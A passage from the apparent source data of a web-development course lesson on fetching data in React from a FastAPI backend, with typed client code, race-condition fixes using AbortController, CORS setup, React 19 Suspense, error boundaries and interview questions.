<li>Change the API: a FastAPI endpoint that returns what the screen needs in one round trip (a "backend for frontend" shape). Real dependencies (you need the user's <code>org_id</code> before fetching the org) are fine; accidental ones are the bug.</li>
</ul>
<h5>5. CORS</h5>
<p><b>Cross-Origin Resource Sharing</b> is a browser rule: a page from <code>http://localhost:5173</code> (Vite) calling <code>http://localhost:8000</code> (Uvicorn) is cross-origin (different port = different origin), so the browser only exposes the response if the server says it's allowed via <code>Access-Control-Allow-Origin</code>. A JSON <code>POST</code> (<code>Content-Type: application/json</code> is not a "simple" content type) or a request with an <code>Authorization</code> header first triggers a <b>preflight</b> <code>OPTIONS</code> request. Two ways to deal with it:</p>
<ul class="pts">
<li><b>Allow the origin</b> on FastAPI with <code>CORSMiddleware</code> (list exact origins; with cookies you need <code>allow_credentials=True</code> and must not rely on a <code>"*"</code> origin, because browsers reject wildcard origins for credentialed requests).</li>
<li><b>Make it same-origin</b>: in dev, Vite's <code>server.proxy</code> forwards <code>/api/*</code> to Uvicorn, so the browser only ever talks to <code>localhost:5173</code>; in prod, Nginx/a CDN/an ingress serves the SPA and routes <code>/api</code> to FastAPI on the same domain. No CORS at all, and cookies are first-party. This is the setup used throughout this course.</li>
</ul>
<p>CORS is not security for your API: it protects <i>users' browsers</i> from other sites reading responses. <code>curl</code> ignores it completely. Your API still needs authentication and authorisation.</p>
<h5>6. Suspense for data and <code>use(promise)</code> (React 19)</h5>
<p>React 19 added the <code>use</code> API. <code>use(promise)</code> reads the value of a promise during render: if the promise is still pending, the component <b>suspends</b> and the nearest <code>&lt;Suspense fallback&gt;</code> shows; when it resolves, React re-renders and <code>use</code> returns the value; if it rejects, the error is thrown to the nearest <b>error boundary</b>. Unlike hooks, <code>use</code> may be called inside conditions and loops (it must still be called inside a component or hook).</p>
<p>The catch, and it is the whole game: <b>the promise must be stable across renders</b>. If you write <code>use(fetch(...))</code> in the component body, each render creates a <i>new</i> promise, which suspends again, which renders again: an endless loop of requests. React warns about "uncached promises" in this case. The promise must be created <i>outside</i> render (in a module-level cache keyed by id, a route loader, an event handler, a parent that stores it in state) or come from a Suspense-aware library (TanStack Query's <code>useSuspenseQuery</code>, a framework). The React docs themselves say promises created in Client Components are recreated on every render and recommend passing promises from a Server Component or a Suspense-compatible library. Treat hand-rolled <code>use(promise)</code> caches as a learning tool; the exact recommendations are still evolving, so check the current React docs before building on it.</p>
<h5>7. Error boundaries for failed loads</h5>
<p>When rendering throws (including <code>use</code> on a rejected promise or <code>useSuspenseQuery</code> on a failed query), React unmounts up to the nearest <b>error boundary</b> and renders its fallback. Error boundaries are still class components (<code>static getDerivedStateFromError</code> + <code>componentDidCatch</code>), or the widely used <code>react-error-boundary</code> package. They do <i>not</i> catch errors in event handlers, in your own <code>setTimeout</code>s or in promise callbacks you don't hand to React: with the effect-based pattern you keep errors in state and render them yourself. Day 10 covers error boundaries as a component pattern.</p>
<h5>8. Why "fetch in <code>useEffect</code>" is discouraged for real apps</h5>
<p>It works, and you must understand it, but every screen then re-implements the same missing features:</p>
<ul class="pts">
<li><b>No cache</b>: navigate away and back and you refetch and show a spinner again.</li>
<li><b>No deduplication</b>: three components needing <code>/api/me</code> fire three requests.</li>
<li><b>No retries, no refetch on focus/reconnect, no stale-while-revalidate.</b></li>
<li><b>No coordination with mutations</b>: after a <code>POST</code>, who refetches which lists?</li>
<li><b>Waterfalls by construction</b>: fetching starts only after render and commit.</li>
<li><b>Boilerplate and bugs</b>: every hand-written effect is a new chance to forget cleanup.</li>
</ul>
<p>The React docs recommend a framework's data fetching, or a client-side cache such as <b>TanStack Query</b> (next topic), SWR, or <b>router loaders</b> (Day 8). Keep raw effects for small cases and for learning.</p>`,
      why: `<p>Almost every production screen is "show data from the server, let the user change it". Before data libraries, React developers fetched in <code>componentDidMount</code> (class components) and later <code>useEffect</code>, and the same bugs appeared in every codebase: a profile page flashing the previous user's data, spinners on every back-navigation, a list that doesn't update after a create, error states that never render because <code>fetch</code> didn't reject on a 500, and pages that load in four sequential round trips.</p>
<p>Understanding the raw mechanics matters for three reasons. First, interviews: "fetch data in <code>useEffect</code>, handle loading/error, and fix the race condition" is one of the most common machine-coding prompts. Second, debugging: TanStack Query, router loaders and Suspense are all built from these same pieces (abort signals, promise caches, error propagation), and when they misbehave you need to know what's underneath. Third, architecture: the waterfall and CORS decisions you make (proxy vs CORS, aggregate endpoints, prefetching) shape the performance of the whole React → FastAPI → Redis → PostgreSQL stack, and no library makes them for you.</p>`,
      diagram: {
        html: flow([
          ["userId changes", "render with new props", "w"],
          ["commit", "DOM updated, old effect's cleanup runs", "g"],
          ["abort()", "previous request cancelled", "r"],
          ["effect runs", "new AbortController + fetch", "g"],
          ["API client", "res.ok? parse JSON : throw ApiError", "w"],
          ["setState", "only if !signal.aborted", "g"]
        ]),
        steps: [
          `A prop such as <code>userId</code> changes. React re-renders the component; the effect's dependency array <code>[userId]</code> is now different.`,
          `After commit, React runs the <b>cleanup of the previous effect run</b> first. That cleanup calls <code>controller.abort()</code> on the old request (or sets <code>ignore = true</code>).`,
          `The new effect run creates its own <code>AbortController</code> and calls the API client with <code>signal</code>.`,
          `The API client awaits the response, checks <code>res.ok</code>, parses JSON (or FastAPI's <code>{"detail"}</code> error) and either returns typed data or throws an <code>ApiError</code>.`,
          `The <code>.then</code>/<code>.catch</code> handlers update state only if this run's signal was not aborted, so a late response for an old <code>userId</code> can never overwrite the current one.`
        ]
      },
      ex: [
        {
          t: "A typed API client for FastAPI (src/lib/api.ts)",
          lang: "ts",
          code: `// One place that knows how to talk to the backend.
const BASE_URL: string = import.meta.env.VITE_API_URL ?? ""; // "" = same origin (/api via proxy)

export class ApiError extends Error {
  readonly status: number;
  readonly detail: unknown;
  constructor(status: number, message: string, detail: unknown) {
    super(message);
    this.name = "ApiError";
    this.status = status;
    this.detail = detail;
  }
}

// FastAPI: {"detail": "Not found"} or {"detail": [{loc, msg, type}, ...]} (422)
function messageFrom(body: unknown, res: Response): string {
  if (body && typeof body === "object" && "detail" in body) {
    const detail = (body as { detail: unknown }).detail;
    if (typeof detail === "string") return detail;
    if (Array.isArray(detail)) {
      return detail
        .map((e: { msg?: string }) => e.msg ?? "Invalid value")
        .join("; ");
    }
  }
  return \`\${res.status} \${res.statusText}\`;
}

export async function api<T>(path: string, init: RequestInit = {}): Promise<T> {
  const headers = new Headers(init.headers);
  headers.set("Accept", "application/json");
  const hasJsonBody =
    init.body !== undefined && init.body !== null && !(init.body instanceof FormData);
  if (hasJsonBody && !headers.has("Content-Type")) {
    headers.set("Content-Type", "application/json");
  }

  const res = await fetch(BASE_URL + path, {
    ...init,
    headers,
    credentials: "include", // send the httpOnly session cookie (Day 8)
  });

  if (!res.ok) {
    const text = await res.text(); // body may be JSON or plain text
    let body: unknown = text;
    try {
      body = text ? JSON.parse(text) : null;
    } catch {
      /* not JSON: keep the text */
    }
    throw new ApiError(res.status, messageFrom(body, res), body);
  }

  if (res.status === 204) return undefined as T; // No Content
  return (await res.json()) as T; // a claim, not a check: see Zod on Day 9
}`,
          note: `<p>Every non-2xx becomes an <code>ApiError</code> with the HTTP status, so callers can branch on <code>err.status === 404</code> and retry logic can skip 4xx. The body is read once as text and parsed defensively because a crashed FastAPI worker may return plain text. <code>credentials: "include"</code> sends cookies cross-origin; on the same origin the default (<code>"same-origin"</code>) already does. The class avoids TypeScript parameter properties so it also compiles with the <code>erasableSyntaxOnly</code> option that recent Vite templates enable.</p>`
        },
        {
          t: "Typed endpoint functions on top of the client (src/api/users.ts)",
          lang: "ts",
          code: `import { api } from "../lib/api";

export type User = { id: number; name: string; email: string; org_id: number };
export type Post = { id: number; user_id: number; title: string };
export type NewPost = { title: string; body: string };

export const getUser = (id: number, signal?: AbortSignal) =>
  api<User>(\`/api/users/\${id}\`, { signal });

export const getUserPosts = (id: number, signal?: AbortSignal) =>
  api<Post[]>(\`/api/users/\${id}/posts\`, { signal });

export const createPost = (userId: number, post: NewPost) =>
  api<Post>(\`/api/users/\${userId}/posts\`, {
    method: "POST",
    body: JSON.stringify(post),
  });

export const deletePost = (postId: number) =>
  api<void>(\`/api/posts/\${postId}\`, { method: "DELETE" }); // FastAPI returns 204`,
          note: `<p>Components never build URLs or call <code>fetch</code> directly; they call <code>getUser(id)</code>. That keeps URL changes, auth headers and error handling in one place, makes mocking easy (MSW, Day 14), and every function accepts an optional <code>AbortSignal</code> so callers can cancel.</p>`
        },
        {
          t: "The bug: fetching in an effect without cleanup",
          lang: "tsx",
          code: `import { useEffect, useState } from "react";
import { getUser, type User } from "./api/users";

// BUGGY: no cleanup, so responses can arrive out of order.
export function UserProfileBuggy({ userId }: { userId: number }) {
  const [user, setUser] = useState<User | null>(null);

  useEffect(() => {
    getUser(userId).then(setUser); // also: no error handling at all
  }, [userId]);

  return <h2>{user ? user.name : "Loading..."}</h2>;
}`,
          out: `Click "User 1" (slow: 1200 ms), then "User 2" (fast: 200 ms):
  t=200ms   shows "Bob"    (user 2, correct)
  t=1200ms  shows "Alice"  (user 1 arrives last and overwrites: WRONG)`,
          note: `<p>Both effect runs are alive, and whichever response lands last wins. There is also an unhandled rejection if the request fails, and a "set state on an unmounted component" situation if the user navigates away (React 18+ no longer warns about it, but the work is wasted).</p>`
        },
        {
          t: "Fix 1: the ignore flag",
          lang: "tsx",
          code: `import { useEffect, useState } from "react";
import { getUser, type User } from "./api/users";

export function UserProfile({ userId }: { userId: number }) {
  const [user, setUser] = useState<User | null>(null);

  useEffect(() => {
    let ignore = false; // one flag per effect run (its own closure)
    getUser(userId).then((u) => {
      if (!ignore) setUser(u);
    });
    return () => {
      ignore = true; // runs before the next effect run and on unmount
    };
  }, [userId]);

  return <h2>{user ? user.name : "Loading..."}</h2>;
}`,
          note: `<p>This is the pattern from the React docs. The stale request still completes on the network, but its result is discarded. It's enough for correctness; <code>AbortController</code> is better because it also frees the connection and stops the browser from downloading a large response nobody will use.</p>`
        },
        {
          t: "Fix 2: AbortController with full loading/error/data state",
          lang: "tsx",
          code: `import { useEffect, useState } from "react";
import { ApiError } from "./lib/api";
import { getUser, type User } from "./api/users";

type State =
  | { status: "loading" }
  | { status: "error"; error: Error }
  | { status: "success"; data: User };

export function UserProfile({ userId }: { userId: number }) {
  const [state, setState] = useState<State>({ status: "loading" });

  useEffect(() => {
    const controller = new AbortController();
    setState({ status: "loading" });

    getUser(userId, controller.signal)
      .then((data) => setState({ status: "success", data }))
      .catch((err: unknown) => {
        if (controller.signal.aborted) return; // we cancelled it: not an error
        setState({
          status: "error",
          error: err instanceof Error ? err : new Error(String(err)),
        });
      });

    return () => controller.abort();
  }, [userId]);

  if (state.status === "loading") return <p>Loading user...</p>;
  if (state.status === "error") {
    const notFound = state.error instanceof ApiError && state.error.status === 404;
    return <p role="alert">{notFound ? "No such user." : state.error.message}</p>;
  }
  return (
    <article>
      <h2>{state.data.name}</h2>
      <p>{state.data.email}</p>
    </article>
  );
}`,
          out: `Network tab when switching 1 -> 2 quickly:
  GET /api/users/1   (canceled)
  GET /api/users/2   200
Dev + StrictMode on first mount:
  GET /api/users/1   (canceled)   <- first effect run, aborted by StrictMode's cleanup
  GET /api/users/1   200`,
          note: `<p>The discriminated union makes "loading and error at once" unrepresentable and lets TypeScript narrow <code>state.data</code>. Checking <code>controller.signal.aborted</code> is more robust than checking <code>err.name === "AbortError"</code>, because an abort can surface as different error types depending on where it happened. The canceled request in dev is StrictMode proving your cleanup works; it does not happen in production builds.</p>`
        },
        {
          t: "Extracting it into a reusable useFetch hook (and its limits)",
          lang: "tsx",
          code: `import { useEffect, useState } from "react";

type FetchState<T> =
  | { status: "loading" }
  | { status: "error"; error: Error }
  | { status: "success"; data: T };

// fetcher must be stable or keyed by deps; here deps are explicit.
export function useFetch<T>(
  fetcher: (signal: AbortSignal) => Promise<T>,
  deps: readonly unknown[],
): FetchState<T> {
  const [state, setState] = useState<FetchState<T>>({ status: "loading" });

  useEffect(() => {
    const controller = new AbortController();
    setState({ status: "loading" });
    fetcher(controller.signal).then(
      (data) => {
        if (!controller.signal.aborted) setState({ status: "success", data });
      },
      (err: unknown) => {
        if (controller.signal.aborted) return;
        setState({ status: "error", error: err instanceof Error ? err : new Error(String(err)) });
      },
    );
    return () => controller.abort();
    // eslint-disable-next-line react-hooks/exhaustive-deps -- caller supplies deps
  }, deps);

  return state;
}

// Usage
// const state = useFetch((signal) => getUser(userId, signal), [userId]);`,
          note: `<p>A classic interview exercise. Notice what it still lacks: caching between mounts, deduping identical requests, retries, refetch on focus, invalidation after mutations, pagination. Passing a <code>deps</code> array also defeats the exhaustive-deps lint rule, which is a smell. Every one of those gaps is a reason TanStack Query exists. Custom hooks themselves are Day 10.</p>`
        },
        {
          t: "A waterfall, and two ways to flatten it",
          lang: "tsx",
          code: `import { useEffect, useState } from "react";
import { getUser, getUserPosts, type Post, type User } from "./api/users";

// WATERFALL: Posts only mounts (and starts fetching) after the user arrives.
//   GET /users/7 ......|  GET /users/7/posts ......|      total = a + b
function ProfileWaterfall({ userId }: { userId: number }) {
  const [user, setUser] = useState<User | null>(null);
  useEffect(() => {
    const c = new AbortController();
    getUser(userId, c.signal).then(setUser, () => {});
    return () => c.abort();
  }, [userId]);
  if (!user) return <p>Loading...</p>;
  return (
    <>
      <h2>{user.name}</h2>
      <PostsWaterfall userId={userId} />
    </>
  );
}

function PostsWaterfall({ userId }: { userId: number }) {
  const [posts, setPosts] = useState<Post[] | null>(null);
  useEffect(() => {
    const c = new AbortController();
    getUserPosts(userId, c.signal).then(setPosts, () => {});
    return () => c.abort();
  }, [userId]);
  return posts ? <ul>{posts.map((p) => <li key={p.id}>{p.title}</li>)}</ul> : <p>Loading posts...</p>;
}

// PARALLEL: both requests start in the same effect.
//   GET /users/7 ......|
//   GET /users/7/posts ......|                         total = max(a, b)
export function ProfileParallel({ userId }: { userId: number }) {
  const [data, setData] = useState<{ user: User; posts: Post[] } | null>(null);
  useEffect(() => {
    const c = new AbortController();
    Promise.all([getUser(userId, c.signal), getUserPosts(userId, c.signal)]).then(
      ([user, posts]) => setData({ user, posts }),
      () => {},
    );
    return () => c.abort();
  }, [userId]);
  if (!data) return <p>Loading...</p>;
  return (
    <>
      <h2>{data.user.name}</h2>
      <ul>{data.posts.map((p) => <li key={p.id}>{p.title}</li>)}</ul>
    </>
  );
}
export { ProfileWaterfall };`,
          note: `<p>The posts request does not need the user object (only <code>userId</code>, which we already have), so the dependency is accidental. The other fix is on the backend: a <code>GET /api/users/7/profile</code> FastAPI endpoint that gathers both (concurrently with <code>asyncio.gather</code>, or with a single SQL join) and returns one payload. Errors are swallowed here (<code>() =&gt; {}</code>) only to keep the comparison short; real code sets an error state.</p>`
        },
        {
          t: "CORS option A: FastAPI CORSMiddleware (main.py)",
          lang: "py",
          code: `# Python / FastAPI
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173", "https://app.example.com"],  # exact origins
    allow_credentials=True,          # needed if the browser sends cookies
    allow_methods=["GET", "POST", "PATCH", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
    max_age=600,                     # let browsers cache the preflight for 10 minutes
)

@app.get("/api/users/{user_id}")
async def get_user(user_id: int):
    ...`,
          out: `Browser, cross-origin JSON POST:
  OPTIONS /api/users/7/posts   200  (preflight; Access-Control-Allow-Origin: http://localhost:5173)
  POST    /api/users/7/posts   201`,
          note: `<p>A "CORS error" in the console means the browser blocked <i>reading</i> the response; the request may well have reached FastAPI and run. In JS the <code>fetch</code> promise rejects with a generic <code>TypeError</code> and you cannot read the status, by design. Note the middleware must be added so it wraps your routes; if an exception escapes and a 500 is produced without CORS headers, the browser reports it as a CORS error, which hides the real bug.</p>`
        },
        {
          t: "CORS option B: same origin via the Vite dev proxy (vite.config.ts)",
          lang: "ts",
          code: `import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";

export default defineConfig({
  plugins: [react()],
  server: {
    proxy: {
      // http://localhost:5173/api/users/7 -> http://localhost:8000/api/users/7
      "/api": {
        target: "http://localhost:8000",
        changeOrigin: true,
      },
    },
  },
});`,
          note: `<p>The browser only sees <code>localhost:5173</code>, so there's no CORS and no preflight; the Vite dev server forwards the request to Uvicorn. Leave <code>VITE_API_URL</code> unset so the client uses relative <code>/api/...</code> paths. The proxy exists <b>only in <code>vite dev</code></b> (and <code>vite preview</code> if configured); in production the same job is done by Nginx or your ingress routing <code>/api</code> to FastAPI (Day 15). Same paths in dev and prod means no environment-specific URL bugs.</p>`
        },
        {
          t: "React 19: Suspense + use(promise) with a cached promise",
          lang: "tsx",
          code: `import { Suspense, use, useState } from "react";
import { getUser, type User } from "./api/users";

// The promise cache lives OUTSIDE render, so the same id returns the same promise.
const userCache = new Map<number, Promise<User>>();
function fetchUserCached(id: number): Promise<User> {
  let p = userCache.get(id);
  if (!p) {
    p = getUser(id);
    userCache.set(id, p);
    p.catch(() => userCache.delete(id)); // don't cache failures forever
  }
  return p;
}

function UserName({ id }: { id: number }) {
  const user = use(fetchUserCached(id)); // suspends while pending, throws if rejected
  return <h2>{user.name}</h2>;
}

export function UserPicker() {
  const [id, setId] = useState(1);
  return (
    <>
      <button onClick={() => setId((n) => n + 1)}>Next user</button>
      <Suspense fallback={<p>Loading user...</p>}>
        <UserName id={id} />
      </Suspense>
    </>
  );
}

// WRONG: a new promise every render -> suspends forever / request loop
// function Bad({ id }: { id: number }) { const u = use(getUser(id)); ... }`,
          note: `<p>This works in a Vite app on React 19, but it's a teaching cache: it never expires, never refetches, and grows without bound. Real apps get stable promises from a router loader, a framework, or <code>useSuspenseQuery</code> (TanStack Query). If the id change should keep showing the old name instead of flashing the fallback, wrap the <code>setId</code> in <code>startTransition</code> (Day 12). Because <code>use</code> is new in React 19 and the guidance around caching promises in Client Components is still evolving, check the current docs before relying on it.</p>`
        },
        {
          t: "An error boundary for failed loads (with retry)",
          lang: "tsx",
          code: `import { Component, Suspense, type ErrorInfo, type ReactNode } from "react";

type Props = {
  fallback: (error: Error, reset: () => void) => ReactNode;
  children: ReactNode;
};
type State = { error: Error | null };

// Error boundaries are still class components (or use the react-error-boundary package).
export class ErrorBoundary extends Component<Props, State> {
  state: State = { error: null };

  static getDerivedStateFromError(error: Error): State {
    return { error }; // render phase: switch to the fallback
  }

  componentDidCatch(error: Error, info: ErrorInfo) {
    console.error("Load failed", error, info.componentStack); // send to Sentry in prod
  }

  reset = () => this.setState({ error: null });

  render() {
    if (this.state.error) return this.props.fallback(this.state.error, this.reset);
    return this.props.children;
  }
}

// Usage: boundary OUTSIDE Suspense so both "loading" and "failed" are handled.
export function UserSection({ id }: { id: number }) {
  return (
    <ErrorBoundary
      fallback={(error, reset) => (
        <div role="alert">
          <p>Could not load the user: {error.message}</p>
          <button onClick={reset}>Try again</button>
        </div>
      )}
    >
      <Suspense fallback={<p>Loading user...</p>}>
        {/* <UserName id={id} /> from the previous example */}
        <p>User {id}</p>
      </Suspense>
    </ErrorBoundary>
  );
}`,
          note: `<p>Resetting only helps if the retry produces a <i>new</i> attempt: with the cache above, the failed promise was deleted from the map, so re-rendering creates a fresh request. With TanStack Query you'd pair the boundary with <code>QueryErrorResetBoundary</code> or call <code>reset</code> from <code>useQueryErrorResetBoundary</code>. Boundaries do not catch errors from event handlers or from the <code>.catch</code> of an effect's promise; those you handle in state.</p>`
        }
      ],
      internals: `<p><b>Effect timing.</b> On commit, React records which effects need to run (deps changed). Passive effects (<code>useEffect</code>) are flushed after the browser has had a chance to paint (usually; React may flush them synchronously when a later discrete update forces it). For each effect whose deps changed, React first runs <i>all</i> pending cleanups for that component (the previous run's <code>controller.abort()</code>), then the new effect bodies. On unmount, only cleanups run. That ordering is exactly why the ignore-flag and abort patterns work: the old run's cleanup always executes before the new run starts. Effects store their deps on the fiber's effect list and compare them with <code>Object.is</code>.</p>
<p><b>StrictMode.</b> In development, React mounts each component, then simulates an unmount (running cleanups) and remounts it (running effects again). A fetch effect with correct cleanup therefore shows one canceled request; without cleanup you'd see two completed requests and, with racing state, potentially double state updates. Production does not do this.</p>
<p><b><code>setState</code> after unmount</b> is a no-op on an unmounted fiber; React 18 removed the old warning because it produced false alarms. The real cost is wasted work and, with races, wrong data while still mounted.</p>
<p><b>How Suspense works for data.</b> When a component calls <code>use(promise)</code> with a pending promise, React records the promise, stops rendering that subtree (internally by throwing a special exception that the work loop catches, an implementation detail you shouldn't depend on), and renders the nearest <code>&lt;Suspense&gt;</code> boundary's fallback instead. It attaches a <code>.then</code> to the promise; when it settles, React schedules a re-render of the boundary. React also tracks the promise's status (it annotates the promise object with <code>status</code>/<code>value</code>/<code>reason</code> fields), so on the retry <code>use</code> returns the value synchronously, without suspending again. That is why the <b>same promise instance</b> must be passed on the retry: a new promise has no recorded status and suspends again. For a rejected promise, <code>use</code> throws the reason, and the error propagates up the fiber tree to the nearest boundary whose class has <code>getDerivedStateFromError</code>.</p>
<p><b>Already-revealed content.</b> If a boundary has already shown content and an update makes a child suspend, React would have to hide the visible content and show the fallback again. When the update is a transition (<code>startTransition</code>), React instead keeps showing the old UI until the new data is ready. This is the bridge to concurrent rendering on Day 12.</p>
<p><b>The network layer.</b> <code>AbortController.abort()</code> signals the browser's fetch implementation, which tears down the HTTP request (for HTTP/2 it resets that stream; the TCP connection survives) and rejects the promise with an <code>AbortError</code> <code>DOMException</code>. If the response body was being read, the read rejects too. On the FastAPI side, Starlette can notice the client disconnect (<code>await request.is_disconnected()</code>), but a handler that's already running a SQL query typically runs to completion unless you check for it.</p>`,
      prod: `<p><b>The shape in a React → FastAPI → Redis → PostgreSQL product.</b> One <code>api.ts</code> client, one module of typed endpoint functions per resource (<code>users.ts</code>, <code>orders.ts</code>), types generated from FastAPI's OpenAPI schema or validated with Zod, and no component calling <code>fetch</code> directly. In dev the Vite proxy sends <code>/api</code> to Uvicorn; in prod Nginx/the ingress routes <code>/api</code> to the FastAPI service on the same domain, so cookies are first-party and there are no preflights. Raw <code>useEffect</code> fetching is limited to rare cases (a one-off widget); everything else goes through TanStack Query or router loaders.</p>
<p><b>What goes wrong at scale:</b></p>
<ul class="pts">
<li><b>Silent failures.</b> Code that does <code>const data = await (await fetch(url)).json()</code> renders <code>{"detail": "Not authenticated"}</code> as if it were a list, then crashes on <code>data.map</code>. The typed client with <code>res.ok</code> checks prevents this whole class.</li>
<li><b>Waterfalls in disguise.</b> A dashboard with eight widgets each fetching after a lazy chunk loads can take 3-4 seconds on mobile even though every endpoint is fast. Measure with the Network tab's waterfall column; fix with prefetching, route loaders, parallel queries, or a BFF endpoint.</li>
<li><b>Thundering herds.</b> Ten components mounting with the same effect fire ten identical requests; with refetch-on-focus they fire again every time the user alt-tabs. Deduplication (a cache layer) fixes it; Redis on the backend absorbs it but you still pay for the connections.</li>
<li><b>CORS misconfiguration in prod.</b> <code>allow_origins=["*"]</code> plus cookies does not work for credentialed requests; reflecting any origin with credentials is a security hole. Prefer same-origin; if you must go cross-origin (separate API domain), list exact origins per environment.</li>
<li><b>Error observability.</b> Error boundaries report render failures to Sentry; the API client should also attach a request id (FastAPI middleware can return an <code>X-Request-ID</code> header) to the <code>ApiError</code> so a support ticket can be traced to a log line.</li>
<li><b>Aborts are not rollbacks.</b> Cancelling a <code>POST</code> on the client doesn't undo it on the server. Mutations should be idempotent or carry an idempotency key when users can double-submit or navigate mid-request.</li>
</ul>`,
      iq: [
        ["fresher", "Does <code>fetch</code> reject when the server returns a 404 or 500?", "No. <code>fetch</code> resolves for any HTTP response, including 4xx and 5xx; you must check <code>res.ok</code> (status 200-299) or <code>res.status</code> yourself. It rejects only for network-level failures: offline, DNS, connection refused, CORS blocks and aborts. The tempting wrong answer, \"it throws on errors like axios does\", leads to code that treats an error body as data."],
        ["fresher", "How do you show loading, error and success states for data fetched in a component?", "Keep the request status in state, ideally as one discriminated union (<code>{status:'loading'} | {status:'error', error} | {status:'success', data}</code>), set it from the effect, and render a branch per status. Separate booleans (<code>isLoading</code>, <code>error</code>, <code>data</code>) work but allow impossible combinations such as loading and error at once, and you have to remember to reset each one when the input changes."],
        ["mid", "What is a race condition in data fetching, and how do you fix it in <code>useEffect</code>?", "When an input (like <code>userId</code>) changes quickly, multiple requests are in flight, and responses can arrive out of order, so an older response overwrites the newer one. Fix it with cleanup: an <code>ignore</code> flag set in the cleanup and checked before <code>setState</code>, or an <code>AbortController</code> whose <code>abort()</code> runs in the cleanup, which also cancels the network request. Debouncing alone is not a fix: it reduces how often it happens but two requests can still overlap."],
        ["mid", "Why do I see every request twice in development?", "StrictMode in development mounts, unmounts and remounts components, so effects run, clean up, and run again. This is deliberate: it exposes missing cleanups. With an <code>AbortController</code> cleanup you'll see the first request canceled. It doesn't happen in production builds. Removing StrictMode to \"fix\" it hides the bug instead of fixing it; if a double request is harmful (e.g. a non-idempotent POST in an effect), the real problem is doing that work in an effect at all."],
        ["mid", "What is CORS, and how would you handle it between a Vite app on :5173 and FastAPI on :8000?", "CORS is the browser's rule that a page may only read cross-origin responses the server explicitly allows (via <code>Access-Control-Allow-Origin</code>, plus a preflight <code>OPTIONS</code> for non-simple requests such as JSON POSTs). Different ports are different origins. Either configure FastAPI's <code>CORSMiddleware</code> with exact origins (and <code>allow_credentials=True</code> for cookies), or avoid it by making requests same-origin: Vite's <code>server.proxy</code> in dev and a reverse proxy in prod. CORS is not API security; non-browser clients ignore it."],
        ["mid", "What is a request waterfall and how do you avoid one?", "A chain of requests that run sequentially although they could run in parallel, typically because a child component only mounts (and starts its fetch) after the parent's data arrives. Total latency becomes the sum instead of the max. Avoid it by starting independent requests together (<code>Promise.all</code>, parallel queries), fetching before render (route loaders, prefetch on hover), or adding an aggregate endpoint. Genuine dependencies (need the user's org id to fetch the org) remain sequential, and that's fine."],
        ["senior", "How does <code>use(promise)</code> work in React 19, and what's the most common mistake?", "<code>use</code> reads a promise during render: pending means the component suspends and the nearest Suspense boundary shows its fallback; resolved returns the value; rejected throws to the nearest error boundary. It can be called conditionally, unlike hooks. The common mistake is creating the promise during render (<code>use(fetch(...))</code>): every render makes a new promise, so it suspends forever and refetches in a loop. The promise must be cached or created outside render: a loader, a framework, a parent, or a Suspense-enabled library like TanStack Query's <code>useSuspenseQuery</code>."],
        ["senior", "Why do the React docs discourage fetching in <code>useEffect</code> for real apps?", "Effects run only after render and commit, so fetching in them creates waterfalls and can't start early; and every effect re-implements caching, deduplication, retries, refetch on focus/reconnect, cancellation, and invalidation after mutations, usually incompletely. Nothing is shared between components or survives navigation. A server-state cache (TanStack Query) or router loaders solve these once. It's not that effects are wrong; they're the low-level primitive the libraries are built on."],
        ["senior", "Does aborting a fetch stop the work on the FastAPI server?", "Not necessarily. Abort closes the client side of the request; the server may notice the disconnect, but a handler already executing a database query or a write usually completes. So aborts save client bandwidth and prevent stale UI updates, but they are not rollbacks. Writes must be idempotent or protected with idempotency keys, and expensive endpoints can check <code>request.is_disconnected()</code> between steps."],
        ["architect", "A dashboard takes 4 s to become useful although every API endpoint responds in under 150 ms. How do you investigate and fix it?", "Open the Network waterfall: it's almost always sequential requests (lazy chunk → render → fetch → child chunk → fetch) plus per-request overhead (preflights from cross-origin calls, cold connections). Fixes: serve the API same-origin to remove preflights; start data loading at the route level (loaders or <code>prefetchQuery</code>) in parallel with code loading; use parallel queries; collapse chatty calls into a BFF/aggregate FastAPI endpoint backed by Redis; and stream with Suspense boundaries so the shell and fast widgets show first. Measure LCP/INP before and after rather than guessing (Day 11)."],
        ["lead", "What conventions would you set for data fetching in a team's React codebase?", "One API client module (base URL, auth, <code>res.ok</code> checks, typed <code>ApiError</code>, request ids); endpoint functions per resource with generated or Zod-validated types; no <code>fetch</code> in components (lint rule); server state through TanStack Query with a query-key factory per feature; route-level prefetching for primary data; error boundaries per section reporting to Sentry; MSW handlers mirroring the endpoint functions for tests. The goal is that a new screen is mostly declaring which data it needs, with no hand-written cleanup or retry logic."]
      ],
      gotchas: [
        `<b><code>await res.json()</code> on an error response</b> happily parses FastAPI's <code>{"detail": ...}</code> and returns it as if it were your data. Always check <code>res.ok</code> first.`,
        `<b>204 No Content</b> (typical for FastAPI <code>DELETE</code>) has no body: <code>res.json()</code> throws <code>SyntaxError: Unexpected end of JSON input</code>. Handle 204 explicitly in the client.`,
        `<b>A CORS failure is indistinguishable from \"network down\" in JS</b> (<code>TypeError: Failed to fetch</code>). Read the browser console, not the caught error. And an unhandled 500 that skips the CORS middleware's headers also shows up as a CORS error.`,
        `<b>An <code>async</code> effect function is not allowed</b>: <code>useEffect(async () =&gt; ...)</code> returns a promise, but React expects the return value to be a cleanup function or nothing. Define an inner async function and call it, and keep the cleanup synchronous.`,
        `<b>Objects in the dependency array</b> (<code>[filters]</code> where <code>filters</code> is created during render) change identity every render and refetch in a loop. Depend on primitives (<code>filters.status</code>) or memoise.`,
        `<b>Stale data shown with a new id</b>: if you don't reset state when <code>userId</code> changes, the old user stays visible while the new one loads. Reset to loading in the effect, or give the component a <code>key={userId}</code> so React remounts it with fresh state.`,
        `<b>Recent versions of <code>eslint-plugin-react-hooks</code></b> include stricter rules (from the React Compiler work) that may flag calling <code>setState</code> synchronously at the top of an effect. It's another sign that hand-rolled fetching is fighting the framework; libraries avoid it. Check the plugin version your project uses.`,
        `<b>Caching failed promises</b> in a <code>use(promise)</code> cache means the component fails forever. Evict on rejection, and decide how and when entries expire.`,
        `<b>Error boundaries do not catch</b> errors thrown in event handlers, <code>setTimeout</code> callbacks, or promise <code>.catch</code> handlers that React never sees. They catch errors during render (including <code>use</code> on a rejected promise), in lifecycle methods and in constructors below them.`
      ],
      best: [
